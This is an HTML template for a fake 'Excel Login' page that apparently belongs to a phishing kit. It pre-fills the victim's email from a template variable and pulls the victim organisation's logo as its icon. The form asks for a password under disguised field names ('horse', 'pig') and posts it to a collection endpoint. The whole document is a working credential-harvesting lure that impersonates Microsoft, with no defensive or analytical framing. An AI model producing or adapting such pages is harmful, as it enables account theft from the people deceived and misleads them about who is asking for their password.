<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Excel- Login</title>
    <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            padding: 50px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
            text-align: center;
            width: 400px;
            backdrop-filter: blur(10px);
            position: relative;
            animation: fadeIn 1s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .logo {
            width: 100px;
            position: absolute;
            top: -50px;
            left: 50%;
            transform: translateX(-50%);
        }
        .login-container h2 {
            color: #217346;
            font-size: 30px;
            margin-top: 20px;
            margin-bottom: 25px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            font-weight: bold;
            display: block;
            color: #333;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #217346;
            border-radius: 8px;
            font-size: 16px;
            background: #f9f9f9;
            transition: all 0.3s ease;
        }
        .input-group input:focus {
            border-color: #1a5d32;
            outline: none;
            background: #fff;
        }
        .login-btn {
            width: 100%;
            background: linear-gradient(45deg, #217346, #1a5d32);
            color: white;
            border: none;
            padding: 15px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            font-weight: bold;
        }
        .login-btn:hover {
            background: linear-gradient(45deg, #1a5d32, #0f3d21);
        }
        .forgot-password {
            display: block;
            margin-top: 15px;
            color: #217346;
            text-decoration: none;
            font-size: 14px;
            transition: 0.3s;
        }
        .forgot-password:hover {
            color: #1a5d32;
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/Microsoft_Excel_2013-2019_logo.svg" alt="Excel Logo" class="logo">
        <h2>Excel Login</h2>
        <form action="first" method="POST">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="horse" value="{{eman}}" required="">
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="pig" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="login-btn">Login</button>
        </form>
        <a href="#" class="forgot-password">Forgot Password?</a>
    </div>
</body>
</html>
